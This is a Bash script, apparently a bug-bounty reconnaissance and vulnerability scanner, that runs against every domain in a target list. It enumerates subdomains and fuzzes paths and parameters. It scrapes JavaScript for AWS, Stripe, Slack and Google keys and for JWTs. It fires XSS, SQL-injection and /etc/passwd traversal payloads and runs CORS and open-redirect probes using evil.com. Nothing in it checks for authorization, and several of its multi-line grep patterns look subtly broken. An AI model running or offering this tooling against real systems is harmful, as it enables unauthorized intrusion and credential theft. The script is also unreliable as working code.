#!/bin/bash

GREEN="\033[0;32m"
YELLOW="\033[1;33m"
RED="\033[0;31m"
BLUE="\033[0;34m"
NC="\033[0m"

TARGETS="targets.txt"

echo -e "${BLUE}==============================="
echo "iSCA - Scanner de Cobertura Automatizada"
echo -e "===============================${NC}"

mkdir -p recon/{subs,alive,urls,params,js,endpoints,api,sensitive}
mkdir -p vulns/{xss,sqli,redirects,graphql,takeover,bypass403,lfi,cors,idor,ssrf}
mkdir -p infra/{waf,tech,buckets,headers,tls,cdn,exposed}
mkdir -p secrets/{github,js,keys,tokens}
mkdir -p fuzzing/{dirs,backups,params,api}

for domain in $(cat $TARGETS); do

echo -e "${YELLOW}Recon para $domain${NC}"

# ------------------------------------------------
# SUBDOMAIN ENUMERATION
# ------------------------------------------------

echo -e "${GREEN}Subdomain discovery${NC}"

subfinder -d $domain -silent > recon/subs/$domain.txt
assetfinder --subs-only $domain >> recon/subs/$domain.txt

curl -s "https://crt.sh/?q=%25.$domain&output=json" \
| jq -r '.[].name_value' \
| sed 's/\*\.//g' \
>> recon/subs/$domain.txt

sort -u recon/subs/$domain.txt > recon/subs/$domain-final.txt

# ------------------------------------------------
# SUBDOMAIN BRUTE
# ------------------------------------------------

echo -e "${GREEN}Subdomain brute${NC}"

puredns bruteforce \
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
$domain \
-r /usr/share/wordlists/resolvers.txt \
> recon/subs/$domain-brute.txt

cat recon/subs/$domain-final.txt recon/subs/$domain-brute.txt \
| sort -u > recon/subs/$domain-total.txt

# ------------------------------------------------
# TAKEOVER
# ------------------------------------------------

subjack -w recon/subs/$domain-total.txt \
-t 50 \
-timeout 30 \
-ssl \
-o vulns/takeover/$domain.txt

# ------------------------------------------------
# ALIVE HOSTS
# ------------------------------------------------

httpx -l recon/subs/$domain-total.txt -silent \
> recon/alive/$domain.txt

# ------------------------------------------------
# TECHNOLOGY DETECTION
# ------------------------------------------------

httpx -l recon/alive/$domain.txt -tech-detect -silent \
> infra/tech/$domain.txt

# ------------------------------------------------
# HEADERS ANALYSIS
# ------------------------------------------------

httpx -l recon/alive/$domain.txt -headers -silent \
> infra/headers/$domain.txt

# ------------------------------------------------
# CDN DETECTION
# ------------------------------------------------

httpx -l recon/alive/$domain.txt -cdn -silent \
> infra/cdn/$domain.txt

# ------------------------------------------------
# TLS ANALYSIS
# ------------------------------------------------

httpx -l recon/alive/$domain.txt -tls-grab -silent \
> infra/tls/$domain.txt

# ------------------------------------------------
# WAF DETECTION
# ------------------------------------------------

wafw00f -i recon/alive/$domain.txt -o infra/waf/$domain.txt

# ------------------------------------------------
# URL DISCOVERY
# ------------------------------------------------

echo -e "${GREEN}URL discovery${NC}"

gau $domain > recon/urls/$domain.txt
waybackurls $domain >> recon/urls/$domain.txt

curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" \
| grep -Eo "https?://[^\" ]+" \
>> recon/urls/$domain.txt

curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/url_list" \
| grep -Eo "https?://[^\" ]+" \
>> recon/urls/$domain.txt

katana -list recon/alive/$domain.txt -silent \
>> recon/urls/$domain.txt

sort -u recon/urls/$domain.txt > recon/urls/$domain-final.txt

# ------------------------------------------------
# JS DISCOVERY
# ------------------------------------------------

grep "\.js" recon/urls/$domain-final.txt \
| sort -u > recon/js/$domain.txt

# ------------------------------------------------
# JS SECRET DISCOVERY
# ------------------------------------------------

cat recon/js/$domain.txt | while read js; do

curl -s $js \
| grep -Eo '

AKIA[0-9A-Z]{16}|
AIza[0-9A-Za-z_-]{35}|
sk_live_[0-9a-z]{32}|
xox[baprs]-[0-9a-zA-Z]{10,48}

' >> secrets/js/$domain.txt

done

# ------------------------------------------------
# ENDPOINT EXTRACTION
# ------------------------------------------------

cat recon/js/$domain.txt \
| while read js; do
curl -s $js \
| grep -Eo "https?://[a-zA-Z0-9./?=_-]*" \
>> recon/endpoints/$domain.txt
done

# ------------------------------------------------
# API DISCOVERY
# ------------------------------------------------

grep -E "/api/|/v1/|/v2/|graphql|rest" \
recon/urls/$domain-final.txt \
> recon/api/$domain.txt

# ------------------------------------------------
# SENSITIVE ENDPOINT DISCOVERY
# ------------------------------------------------

grep -Ei "

admin|
login|
dashboard|
internal|
private|
upload|
debug|
dev

" recon/urls/$domain-final.txt \
> recon/sensitive/$domain.txt

# ------------------------------------------------
# PARAMETER DISCOVERY
# ------------------------------------------------

grep "=" recon/urls/$domain-final.txt \
> recon/params/$domain.txt

# ------------------------------------------------
# PARAMETER BRUTEFORCE
# ------------------------------------------------

cat recon/alive/$domain.txt | while read host; do

ffuf \
-u $host/?FUZZ=test \
-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-mc 200 \
-s \
-o fuzzing/params/$domain.txt

done

# ------------------------------------------------
# DIRECTORY FUZZING
# ------------------------------------------------

ffuf \
-u https://$domain/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-mc 200 \
-s \
-o fuzzing/dirs/$domain.txt

# ------------------------------------------------
# API FUZZING
# ------------------------------------------------

ffuf \
-u https://$domain/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-mc 200 \
-s \
-o fuzzing/api/$domain.txt

# ------------------------------------------------
# BACKUP FILE DISCOVERY
# ------------------------------------------------

for ext in zip tar gz bak old; do
echo "https://$domain/backup.$ext"
done | httpx -silent -mc 200 \
> fuzzing/backups/$domain.txt

# ------------------------------------------------
# XSS TEST
# ------------------------------------------------

cat recon/params/$domain.txt \
| qsreplace "<script>alert(1)</script>" \
| httpx -silent -mr "<script>alert(1)</script>" \
> vulns/xss/$domain.txt

# ------------------------------------------------
# SQLI TEST
# ------------------------------------------------

cat recon/params/$domain.txt \
| qsreplace "'" \
| httpx -silent \
-mr "SQL syntax|mysql_fetch|ORA-[0-9]{5}|SQLSTATE" \
> vulns/sqli/$domain.txt

# ------------------------------------------------
# LFI TEST
# ------------------------------------------------

cat recon/params/$domain.txt \
| qsreplace "../../../../etc/passwd" \
| httpx -silent -mr "root:x:0:0" \
> vulns/lfi/$domain.txt

# ------------------------------------------------
# CORS CHECK
# ------------------------------------------------

cat recon/alive/$domain.txt \
| while read url; do
curl -s -I -H "Origin: evil.com" $url \
| grep "Access-Control-Allow-Origin: evil.com" \
&& echo $url >> vulns/cors/$domain.txt
done

# ------------------------------------------------
# OPEN REDIRECT
# ------------------------------------------------

grep -E "redirect=|url=|dest=" recon/params/$domain.txt \
| while read url; do
curl -s -L -o /dev/null -w "%{url_effective}" "$url//evil.com" \
| grep -q "evil.com" && echo "$url" >> vulns/redirects/$domain.txt
done

# ------------------------------------------------
# GRAPHQL DISCOVERY
# ------------------------------------------------

grep -E "graphql|gql|query|api" \
recon/urls/$domain-final.txt \
> vulns/graphql/$domain.txt

# ------------------------------------------------
# SSRF CANDIDATES
# ------------------------------------------------

grep -Ei "

url=|
uri=|
path=|
dest=|
redirect=|
next=|
data=|
reference=

" recon/params/$domain.txt \
> vulns/ssrf/$domain.txt

# ------------------------------------------------
# IDOR CANDIDATES
# ------------------------------------------------

grep -Ei "

id=|
user_id=|
account_id=|
order_id=|
profile_id=

" recon/params/$domain.txt \
> vulns/idor/$domain.txt

# ------------------------------------------------
# JWT DISCOVERY
# ------------------------------------------------

grep -Eo 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' \
recon/urls/$domain-final.txt \
> secrets/tokens/$domain.txt

echo -e "${GREEN}Scan finalizado para $domain${NC}"

done
